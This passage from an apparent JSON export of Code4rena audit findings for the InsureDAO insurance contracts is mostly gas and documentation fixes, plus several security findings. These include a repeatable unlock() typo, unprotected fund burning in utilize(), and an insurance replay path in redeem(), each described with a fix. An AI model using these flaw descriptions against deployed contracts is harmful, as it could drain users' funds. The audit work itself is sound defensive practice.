(Vault shares) for the withdraw amount requested, the system will fail on subtraction:  https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Vault.sol#L160   ## Recommended Mitigation Steps  Consider adding a check for the enough _attributions throwing a corresponding error   "}, {"title": "Multiple boolean comparrisons", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/194", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  loop   # Vulnerability details  When checking boolean values in a require or if statement it's an unnecessary operation to compare them to `true`, as it's already checked whether the condition is `true`. For comparison to `false`, it is cheaper to use the `!` operator rather than compare the value.  ## Proof of Concept Lines where boolean comparison is used: - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L99 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L131 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L161 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L176 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L205 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L122 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L142 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L166-L169 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L178-L179 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L204 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L132 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L165 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L217 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L365 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L464 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L184 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L234 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L260 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L354 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L388 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L491 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L550 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L612 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L664  ## Recommended Mitigation Steps Remove the `== true` part from boolean comparisons and change `_variableName == false` to `!_variableName` to save some gas.  "}, {"title": "Typo in PoolTemplate unlock function results in user being able to unlock multiple times", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/192", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  loop   # Vulnerability details  The function `unlock()` in PoolTemplate has a typo where it compares `insurances[_id].status` to `false` rather than setting it to `false`. If the conditions are met to unlock the funds for an id, the user should be able to call the `unlock()` function once for that id as `insurances[_id].amount` is subtracted from `lockedAmount`. However, since `insurances[_id].status` does not get set to `false`, a user can call `unlock()` multiple times for the same id, resulting in `lockedAmount` being way smaller than it should be since `insurances[_id].amount` is subtracted multiple times.   ## Impact `lockedAmount` is used to calculate the amount of underlying tokens available for withdrawals. If `lockedAmount` is lower than it should be users are able to withdraw more underlying tokens than available for withdrawals.  ## Proof of Concept Typo in `unlock()`: - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L360-L362  Calculation of underlying tokens available for withdrawal: - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L836  ## Recommended Mitigation Steps Change `insurances[_id].status == false;` to `insurances[_id].status = false;`  "}, {"title": "PoolTemplate worth function description is incorrect", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/189", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  Underlying and index tokens are mixed up in the worth() function description, making code and its description conflicting  ## Proof of Concept  Worth() computes how many iTokens correspond to given amount of underlying. The description says otherwise, mixing them up:  https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L794-798    ## Recommended Mitigation Steps  Fix the description to say that \u2018_value' is the amount of underlying, while the '_amount' is the corresponding output quantity of iTokens   "}, {"title": "Remove unnecessary if statements for gas optimization ", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/186", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  ospwner   # Vulnerability details  ## Impact Checking arrays' length before using it in a for loop is unnecessary when array's length is used in loop exit condition.   ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Factory.sol#L175  ```         if (_references.length > 0) {             for (uint256 i = 0; i < _references.length; i++)  ```  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Factory.sol#L185 ```         if (_conditions.length > 0) {             for (uint256 i = 0; i < _conditions.length; i++)  ```   ## Recommended Mitigation Steps  Remove the two unnecessary  if statements.   "}, {"title": "Signature replay", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/184", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  0x1f8b   # Vulnerability details  ## Impact Signature replay in `PoolTemplate`.  ## Proof of Concept The `redeem` method of `PoolTemplate` verifies the data stored in `incident`, and the verification logic of this process is performed as following:  ``` require(             MerkleProof.verify(                 _merkleProof,                 _targets,                 keccak256(                     abi.encodePacked(_insurance.target, _insurance.insured)                 )             ) ||                 MerkleProof.verify(                     _merkleProof,                     _targets,                     keccak256(abi.encodePacked(_insurance.target, address(0)))                 ),             \"ERROR: INSURANCE_EXEMPTED\"         ); ```  As can be seen, the only data related to the `_insurance` are` target` and `insured`, so as the incident has no relation with the` Insurance`, apparently nothing prevents a user to call `insure` with high amounts, after receive the incident, the only thing that prevents this from being reused is that the owner creates the incident with an `_incidentTimestamp` from the past.  So if a owner create a incident from the future it's possible to create a new `insure` that could be reused by the same affected address.  Another lack of input verification that could facilitate this attack is the `_span=0` in the `insure` method.  ## Tools Used Manual review.  ## Recommended Mitigation Steps It is mandatory to add a check in `applyCover` that` _incidentTimestamp` is less than the current date and the `span` argument is greater than 0 in the` insure` method.  "}, {"title": "Checking non-zero value can avoid an external call to save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/181", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact Checking if  `_amount != 0 ` before making the transfer call  can save gas by avoiding the external call in such situations.  ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L201-L206  ``` function borrowValue(uint256 _amount, address _to) external onlyMarket override {         debts[msg.sender] += _amount;         totalDebt += _amount;          IERC20(token).safeTransfer(_to, _amount);     }  ```  ## Tools Used Remix  ## Recommended Mitigation Steps Add additional check for non zero ` _amount`.  "}, {"title": "Caching variables", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/178", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact Some of the variables can be cached to slightly reduce gas usage  ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L343  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L406-L407  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L461-L479  ``` function withdrawRedundant(address _token, address _to)         external         override         onlyOwner     {         if (             _token == address(token) &&             balance < IERC20(token).balanceOf(address(this))         ) {             uint256 _redundant = IERC20(token).balanceOf(address(this)) -                 balance;             IERC20(token).safeTransfer(_to, _redundant);         } else if (IERC20(_token).balanceOf(address(this)) > 0) {             IERC20(_token).safeTransfer(                 _to,                 IERC20(_token).balanceOf(address(this))             );         }     } ```  ## Tools Used Remix ## Recommended Mitigation Steps Consider caching those variable for read and make sure write back to storage Example: ``` bal =  IERC20(_token).balanceOf(address(this); ```  "}, {"title": "Incorrect Natspec can lead to errors", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/176", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  0xngndev   # Vulnerability details  ## Impact  Unclear Natspec may confuse the user.  In the `fund` function:  - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L160](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L160)  The Natspec is a copy-paste of the `deposit` function:  - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L130](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L130)  The problem here is the **receives ITokens** part of the Natspec. The deposit function indeed mints tokens to the `msg.sender` but the `fund` function doesn\u2019t. I would clarify that the `fund` function adds attributions to the surplusPool.  Another minor and unclear bit of Natspec happens here: [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Vault.sol#L177](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Vault.sol#L177)  It describes `_amount` as sender of value instead of something like **amount of value to send.**  ## Recommended Mitigation Steps  Explain the Natspec of the `fund` function in more detail. Fix the `transferValue` amount natspec. Also it would be good to add some Natspec to the `defund` function too.  "}, {"title": "Moving Variable Declarations Before Error Checks Can Save Gas on Failure", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/170", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  0xngndev   # Vulnerability details  ## Impact  In `PoolTemplate.sol` there are multiple instances where variables are declared before the error checks of the functions. In cases where a function reverts due to these error checks, that extra computation of calculating the variable being declared can be avoided by simply moving the declaration after the error checks.  Here are all the functions I found where this can be applied:  - `withdraw` function: [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L293](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L293) - `withdrawCredit` function: [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L416](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L416) - `insure` function: [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L465](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L465) - `reedem` function: [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L548](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L548)  ## Recommended Mitigation Steps  - Change `withdraw` function to:  ```solidity function withdraw(uint256 _amount) external returns (uint256 _retVal) {   require(       marketStatus == MarketStatus.Trading,       \"ERROR: WITHDRAWAL_PENDING\"   );   require(       withdrawalReq[msg.sender].timestamp +           parameters.getLockup(msg.sender) <           block.timestamp,       \"ERROR: WITHDRAWAL_QUEUE\"   );   require(       withdrawalReq[msg.sender].timestamp +           parameters.getLockup(msg.sender) +           parameters.getWithdrawable(msg.sender) >           block.timestamp,       \"ERROR: WITHDRAWAL_NO_ACTIVE_REQUEST\"   );   require(       withdrawalReq[msg.sender].amount >= _amount,       \"ERROR: WITHDRAWAL_EXCEEDED_REQUEST\"   );   require(_amount > 0, \"ERROR: WITHDRAWAL_ZERO\");   require(       _retVal <= availableBalance(),       \"ERROR: WITHDRAW_INSUFFICIENT_LIQUIDITY\"   );    uint256 _supply = totalSupply();   require(_supply != 0, \"ERROR: NO_AVAILABLE_LIQUIDITY\");    uint256 _liquidity = originalLiquidity();   _retVal = (_amount * _liquidity) / _supply;    //reduce requested amount   withdrawalReq[msg.sender].amount -= _amount;    //Burn iToken   _burn(msg.sender, _amount);    //Withdraw liquidity   vault.withdrawValue(_retVal, msg.sender);    emit Withdraw(msg.sender, _amount, _retVal); } ```  - Change `withdrawCredit` function to:  ```solidity function withdrawCredit(uint256 _credit)         external         override         returns (uint256 _pending)     {       IndexInfo storage _index = indicies[msg.sender];       require(           IRegistry(registry).isListed(msg.sender) &&               _index.credit >= _credit &&               _credit <= availableBalance(),           \"ERROR: WITHDRAW_CREDIT_BAD_CONDITIONS\"       );        uint256 _rewardPerCredit = rewardPerCredit;        //calculate acrrued premium       _pending = _sub(           (_index.credit * _rewardPerCredit) / MAGIC_SCALE_1E6,           _index.rewardDebt       );        //Withdraw liquidity       if (_credit > 0) {           totalCredit -= _credit;           _index.credit -= _credit;           emit CreditDecrease(msg.sender, _credit);       }        //withdraw acrrued premium       if (_pending > 0) {           vault.transferAttribution(_pending, msg.sender);           attributionDebt -= _pending;           _index.rewardDebt =               (_index.credit * _rewardPerCredit) /               MAGIC_SCALE_1E6;       } } ```  - Change `insure` function to:  ```solidity function insure(         uint256 _amount,         uint256 _maxCost,         uint256 _span,         bytes32 _target     ) external returns (uint256) {       //Distribute premium and fee       uint256 _premium = getPremium(_amount, _span);        require(           _amount <= availableBalance(),           \"ERROR: INSURE_EXCEEDED_AVAILABLE_BALANCE\"       );       require(_premium <= _maxCost, \"ERROR: INSURE_EXCEEDED_MAX_COST\");       require(_span <= 365 days, \"ERROR: INSURE_EXCEEDED_MAX_SPAN\");       require(           parameters.getMinDate(msg.sender) <= _span,           \"ERROR: INSURE_SPAN_BELOW_MIN\"       );        require(           marketStatus == MarketStatus.Trading,           \"ERROR: INSURE_MARKET_PENDING\"       );       require(paused == false, \"ERROR: INSURE_MARKET_PAUSED\");        uint256 _endTime = _span + block.timestamp;       uint256 _fee = parameters.getFeeRate(msg.sender);        //current liquidity       uint256 _liquidity = totalLiquidity();       uint256 _totalCredit = totalCredit;        //accrue premium/fee       uint256[2] memory _newAttribution = vault.addValueBatch(           _premium,           msg.sender,           [address(this), parameters.getOwner()],           [MAGIC_SCALE_1E6 - _fee, _fee]       );        //Lock covered amount       uint256 _id = allInsuranceCount;       lockedAmount += _amount;       Insurance memory _insurance = Insurance(           _id,           block.timestamp,           _endTime,           _amount,           _target,           msg.sender,           true       );       insurances[_id] = _insurance;       allInsuranceCount += 1;        //Calculate liquidity for index       if (_totalCredit > 0) {           uint256 _attributionForIndex = (_newAttribution[0] * _totalCredit) /               _liquidity;           attributionDebt += _attributionForIndex;           rewardPerCredit += ((_attributionForIndex * MAGIC_SCALE_1E6) /               _totalCredit);       }        emit Insured(           _id,           _amount,           _target,           block.timestamp,           _endTime,           msg.sender,           _premium       );          return _id;   } ```  - Change `redeem` function to:  ```solidity function redeem(uint256 _id, bytes32[] calldata _merkleProof) external {       require(           marketStatus == MarketStatus.Payingout,           \"ERROR: NO_APPLICABLE_INCIDENT\"       );       Insurance storage _insurance = insurances[_id];       require(_insurance.status == true, \"ERROR: INSURANCE_NOT_ACTIVE\");       require(_insurance.insured == msg.sender, \"ERROR: NOT_YOUR_INSURANCE\");       uint256 _incidentTimestamp = incident.incidentTimestamp;       require(           marketStatus == MarketStatus.Payingout &&               _insurance.startTime <= _incidentTimestamp &&               _insurance.endTime >= _incidentTimestamp,           \"ERROR: INSURANCE_NOT_APPLICABLE\"       );       bytes32 _targets = incident.merkleRoot;       require(           MerkleProof.verify(               _merkleProof,               _targets,               keccak256(                   abi.encodePacked(_insurance.target, _insurance.insured)               )           ) ||               MerkleProof.verify(                   _merkleProof,                   _targets,                   keccak256(abi.encodePacked(_insurance.target, address(0)))               ),           \"ERROR: INSURANCE_EXEMPTED\"       );       uint256 _payoutNumerator = incident.payoutNumerator;       uint256 _payoutDenominator = incident.payoutDenominator;        _insurance.status = false;       lockedAmount -= _insurance.amount;        uint256 _payoutAmount = (_insurance.amount * _payoutNumerator) /           _payoutDenominator;        vault.borrowValue(_payoutAmount, msg.sender);        emit Redeemed(           _id,           msg.sender,           _insurance.target,           _insurance.amount,           _payoutAmount       );   } ```  "}, {"title": "Unnecessary use of _msgSender()", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/166", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact The use of _msgSender() when there is no implementation of a meta transaction mechanism that uses it, such as EIP-2771, very slightly increases gas consumption.  ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/InsureDAOERC20.sol#L105  ``` function transfer(address recipient, uint256 amount)         public         virtual         override         returns (bool)     {         _transfer(_msgSender(), recipient, amount);         return true;     } ```  ## Tools Used Remix ## Recommended Mitigation Steps Replace _msgSender() with msg.sender if there is no mechanism to support meta-transactions like EIP-2771 implemented.  "}, {"title": "The fund function of the CDSTemplate contract does not match the description", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/161", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  cccz   # Vulnerability details  ## Impact  The fund function of the CDSTemplate contract does not match the description, the caller will not receive any iToken after sending tokens, and the owner can take away the tokens in surplusPool.  ```     /**      * @notice A liquidity provider supplies collatral to the pool and receives iTokens      * @param _amount amount of token to deposit      */     function fund(uint256 _amount) external {         require(paused == false, \"ERROR: PAUSED\");          //deposit and pay fees         uint256 _attribution = vault.addValue(             _amount,             msg.sender,             address(this)         );          surplusPool += _attribution;          emit Fund(msg.sender, _amount, _attribution);     }      function defund(uint256 _amount) external override onlyOwner {         require(paused == false, \"ERROR: PAUSED\");          uint256 _attribution = vault.withdrawValue(_amount, msg.sender);         surplusPool -= _attribution;          emit Defund(msg.sender, _amount, _attribution);     } ```  ## Proof of Concept  https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L156-L182  ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  Change the description of the fund function or send iToken to the caller  "}, {"title": "Owner can call `applyCover` multiple times in `PoolTemplate.sol`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/160", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  camden   # Vulnerability details  ## Impact The owner could potentially extend the insurance period indefinitely in the `applyCover` function without ever allowing the market to resume. This is because there is no check in `applyCover` to ensure that the market is in a `Trading` state.  This can also allow the owner to emit fraudulent `MarketStatusChanged` events.  ## Recommended Mitigation Steps Require that the market be in a `Trading` state to allow another `applyCover` call.  "}, {"title": "Remove unnecessary address cast in Vault.sol", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/159", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The Vault.sol contract contains several state variables of type address. There is no need to cast these variable to type address because they are already of type address. Removing the cast function can save gas.  ## Proof of Concept  The token address state variable is unnecessarily cast to address type in two places in Vault.sol: - [Line 350](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L350) - [Line 467](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L467)  ## Recommended Mitigation Steps  Remove the unnecessary address cast from address variables.  "}, {"title": "Tokens can be burned with no access control", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/158", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The Vault.sol contract has two address state variables, the `keeper` variable and the `controller` variable, which are both permitted to be the zero address. If both variables are zero simultaneously, any address can burn the available funds (available funds = balance - totalDebt) by sending these tokens to the zero address with the unprotected `utilitize()` function. If a user has no totalDebt, the user can lose their entire underlying token balance because of this.  ## Proof of Concept  The problematic `utilize()` function is [found here](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L342-L352). To see how the two preconditions can occur: 1. The keeper state variable is only changed by the `setKeeper()` function [found here](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L502). If this function is not called, the keeper variable will retain the default value of address(0), which bypasses [the only access control for the utilize function](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L344). 2. There is a comment [here on line 69](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L502https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L502) stating the controller state variable can be zero. There is no zero address check for the controller state variable in the Vault constructor.  If both address variables are left at their defaults of address(0), then the safeTransfer() call [on line 348](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L348) would send the tokens to address(0).  ## Recommended Mitigation Steps  Add the following line to the very beginning of the `utilize()` function: `require(address(controller) != address(0))`  This check is already found in many other functions in Vault.sol, including the `_unutilize()` function.  "}, {"title": "Incorrect return value comment", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/157", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The comment for the return value of the `getCDS()` function in Registry.sol is incorrectly copied from elsewhere, possibly the `confirmExistence()` function. The return value is an address, not a boolean. This is considered low risk based on C4's [risk ratings](https://docs.code4rena.com/roles/wardens/judging-criteria#estimating-risk-tl-dr).  ## Proof of Concept  The problematic comment is from the `getCDS()` function [here](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Registry.sol#L99). It is an incorrect duplicate of the comment for the `confirmExistence()` function [found here](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Registry.sol#L113).  ## Recommended Mitigation Steps  Replace the comment with something like `@return CDS contract address`, which is used to describe this value in the `setCDS()` function.  "}, {"title": "Use `calldata` instead of `memory` for function parameters", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/145", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  defsec   # Vulnerability details  ## Impact  In some cases, having function arguments in calldata instead of memory is more optimal.  Consider the following generic example:  ``` contract C { function add(uint[] memory arr) external returns (uint sum) { uint length = arr.length; for (uint i = 0; i < arr.length; i++) { sum += arr[i]; } } } ``` In the above example, the dynamic array arr has the storage location memory. When the function gets called externally, the array values are kept in calldata and copied to memory during ABI decoding (using the opcode calldataload and mstore). And during the for loop, arr[i] accesses the value in memory using a mload. However, for the above example this is inefficient. Consider the following snippet instead:  ``` contract C { function add(uint[] calldata arr) external returns (uint sum) { uint length = arr.length; for (uint i = 0; i < arr.length; i++) { sum += arr[i]; } } } ```  In the above snippet, instead of going via memory, the value is directly read from calldata using calldataload. That is, there are no intermediate memory operations that carries this value.  Gas savings: In the former example, the ABI decoding begins with copying value from calldata to memory in a for loop. Each iteration would cost at least 60 gas. In the latter example, this can be completely avoided. This will also reduce the number of instructions and therefore reduces the deploy time cost of the contract.  In short, use calldata instead of memory if the function argument is only read.  Note that in older Solidity versions, changing some function arguments from memory to calldata may cause \"unimplemented feature error\". This can be avoided by using a newer (0.8.*) Solidity compiler.  Examples Note: The following pattern is prevalent in the codebase:  ``` function f(bytes memory data) external { (...) = abi.decode(data, (..., types, ...)); } ```  Here, changing to bytes calldata will decrease the gas. The total savings for this change across all such uses would be quite significant.   ## Proof Of Concept  Examples:  ``` https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Factory.sol#L176  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Factory.sol#L186  ```  ## Tools Used  None  ## Recommended Mitigation Steps  Change memory definition with calldata.  "}, {"title": "Save gas in requestWithdraw()", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/142", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  Users that incorrectly ask for a withdrawal equal to zero, will waste more gas (a storage read) since the check for `amount > 0` is put after the check for the available amount  ## Proof of Concept  - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L191](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L191) - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L199](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L199) - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L282](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L282)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Move this require at the top of the `requestWithdraw` function:  ```jsx require(_amount > 0, \"ERROR: REQUEST_ZERO\"); ```  "}, {"title": "totalAllocPoint in IndexTemplate.sol can be cached", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/140", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  `totalAllocPoint` in `set()` function is read several times from storage. It can be assigned to a local variable so the function is less expensive overall  ## Proof of Concept  [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L612](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L612)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Assign `totalAllocPoint` to `localTotalAllocPoint` (or `cachedTotalAllocPoint`)  "}, {"title": "commitTransferOwnership() could save gas 1", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/139", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  When emitting the event, the function argument could be used, instead of reading from storage again  ## Proof of Concept  [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Ownership.sol#L62](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Ownership.sol#L62)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Change to:  ```jsx emit CommitNewOwnership(newOwner); ```  "}, {"title": "Avoid expensive storage reads in Parameters.sol", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/137", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  Many functions that read params, check whether the value is set for the given `target`, otherwise return the value for the zero-address. When doing this kind of check, the value of the `target` is read twice:  - once for checking if it\u2019s set - if it\u2019s set, it\u2019s read once more to read the actual params  These functions are used a lot of times inside all the contracts, so having them optimized as much as possible is required in order to save gas  ## Proof of Concept  - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L240](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L240) - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L271](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L271) - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L289](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L289) - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L313](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L313) - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L331](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L331) - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L343](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L343) - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L379](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L379) - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L397](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L397)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Assign the target value and, if the check returns a value different from the zero-address, use it. For example, `getFeeRate` becomes:  ```jsx function getFeeRate(address _target)     external     view     override     returns (uint256) {     uint256 _targetFee = _fee[_target];     if (_targetFee == 0) {         return _fee[address(0)];     } else {         return _targetFee;     } } ```  "}, {"title": "In PoolTemplate.sol, deposit() and _depositFrom() can re-use the same code", "html_url": 